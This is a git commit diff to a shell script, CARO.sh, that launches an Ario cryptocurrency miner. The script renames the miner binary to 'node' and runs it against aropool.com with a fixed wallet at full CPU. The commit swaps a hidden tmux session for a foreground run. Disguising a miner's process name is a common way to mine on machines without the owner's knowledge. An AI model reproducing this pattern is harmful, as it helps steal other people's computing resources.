31d41a150df56743cab90969728b939b4b9a6c67
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-06-22 10:53:51 +0700

    Update CARO.sh

--- CARO.sh
+++ CARO.sh
@@ -8,7 +8,7 @@ then
 else
 
 echo "script da install , chay thoi "
-tmux new-session -d -s my_session1 './node --mode miner --pool http://aropool.com --wallet 5mKUv6nXuCH8NMsc1CeEjmwVhgawPU3DTowP8j55hYA8BWz8e39UbuLK8gEWkDWJdNcZb38Pxxmfj1GXYMVJf389 --name test --cpu-intensity 100 --gpu-intensity-cblocks 0 --gpu-intensity-gblocks 0'
+./node --mode miner --pool http://aropool.com --wallet 5mKUv6nXuCH8NMsc1CeEjmwVhgawPU3DTowP8j55hYA8BWz8e39UbuLK8gEWkDWJdNcZb38Pxxmfj1GXYMVJf389 --name test --cpu-intensity 100 --gpu-intensity-cblocks 0 --gpu-intensity-gblocks 0
     
 fi
 exit
@@ -20,4 +20,4 @@ tar -zxf ariominer_v0.2.0_29.05.2019_linux.tar.gz
 cd ariominer_v0.2.0_29.05.2019_linux
 mv ariominer node
 chmod +x node
-tmux new-session -d -s my_session1 './node --mode miner --pool http://aropool.com --wallet 5mKUv6nXuCH8NMsc1CeEjmwVhgawPU3DTowP8j55hYA8BWz8e39UbuLK8gEWkDWJdNcZb38Pxxmfj1GXYMVJf389 --name test --cpu-intensity 100 --gpu-intensity-cblocks 0 --gpu-intensity-gblocks 0'
+./node --mode miner --pool http://aropool.com --wallet 5mKUv6nXuCH8NMsc1CeEjmwVhgawPU3DTowP8j55hYA8BWz8e39UbuLK8gEWkDWJdNcZb38Pxxmfj1GXYMVJf389 --name test --cpu-intensity 100 --gpu-intensity-cblocks 0 --gpu-intensity-gblocks 0
